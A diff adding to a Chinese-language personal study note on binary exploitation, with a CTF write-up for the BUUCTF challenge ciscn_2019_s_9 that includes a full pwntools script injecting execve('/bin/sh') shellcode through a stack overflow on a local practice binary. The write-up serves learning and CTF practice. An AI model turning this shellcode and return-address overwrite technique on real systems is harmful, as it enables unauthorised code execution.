@@ -160,6 +160,34 @@ add与sub具有存储的功能，test和cmp没有。
 
 
 
+### payload编写函数合集：
+
+
+
+#### `ljust(宽度, 填充符)`：
+
+这是 Python 字符串/字节流自带的格式化函数。它的意思是：把 `shellcode` 靠左对齐，如果总长度不够 `0x24`（十进制 36）个字节，就在右边不断填充 `b'\x90'`，直到总长度精准达到 36 字节。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
+
+
 ### 溢出：
 
 正数加整数出现负数，负数加负数出现正数。
@@ -300,6 +328,82 @@ int 0x80
 64位的系统其实也就是改一下寄存器名字，syscall内的位置，操作一样。
 
 ![image-20260224145253384](/images/image-20260224145253384.png)
+
+
+
+---
+
+
+
+##### shellcode在溢出中的使用.例1：
+
+![image-20260224211435430](/images/image-20260224211435430.png)
+
+> [BUUCTF-ciscn_2019_s_9 - -ro0t - 博客园](https://www.cnblogs.com/sakura-zz/articles/16221860.html)
+
+栈溢出，通过fgets的溢出覆盖rip的返回地址，从而执行我们的shellcode。//手操pwngdb一点一点复现和确认的。
+
+![image-20260224222155800](/images/image-20260224222155800.png)
+
+0x24的堆满字节加0x4的ebp字节，剩下10字节。
+
+利用10字节回弹到前面的30字节中，并在30字节内编写shellcode。
+
+![image-20260224223233092](/images/image-20260224223233092.png)
+
+```
+from pwn import *
+
+p = process("./ciscn_s_9")
+context.arch = 'i386' 
+context.os = 'linux'
+
+shellcode_asm = '''
+xor eax,eax
+xor edx,edx
+push edx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx,esp
+xor ecx,ecx
+mov al,0xb
+int 0x80
+'''
+shellcode = asm(shellcode_asm) # 汇编成机器码
+# shellcode
+
+
+payload = shellcode.ljust(0x24, b'\x90') 
+payload += p32(0x08048554)
+payload += asm("sub esp, 40; call esp")# 令其再走一遍到我们的开头
+
+p.sendline(payload)
+p.interactive()
+```
+
+![image-20260224224157102](/images/image-20260224224157102.png)
+
+简单打穿自己的linux，成功复现完成。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
+
 
 ##### 快速生成：
 
